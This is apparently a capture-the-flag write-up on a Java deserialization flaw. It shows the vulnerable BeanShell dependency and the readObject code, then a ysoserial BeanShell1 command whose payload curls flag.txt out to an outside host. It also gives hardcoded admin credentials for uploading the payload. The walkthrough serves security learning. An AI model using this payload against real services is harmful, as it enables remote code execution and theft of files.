Inside pom.xml file we see 

```xml
        <dependency>
            <groupId>org.beanshell</groupId>
            <artifactId>bsh</artifactId>
            <version>2.0b5</version>
        </dependency>
```

next step is to generate proper payload to abuse `readObject` with our binary payload.


```java
    private Device deserializeDevice(byte[] data) throws Exception {
        try (ByteArrayInputStream bis = new ByteArrayInputStream(data);
                ObjectInputStream ois = new ObjectInputStream(bis)) {

            System.out.println("INFO: Starting vulnerable deserialization process.");
            Object deserializedObject = ois.readObject();
```

Payload was generated via `ysoserial` (compiled from source, but you can simply download jar file from github):


```console
$ java --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar  BeanShell1 'curl -X POST --data-binary @flag.txt http://myproxy' > ~/b.bin
```

then you need to login (credentials are hardcoded - admin / password) and upload a new device (where you will upload generated binary). We don't care about any serialization error or anything else, because real execution will be done before.
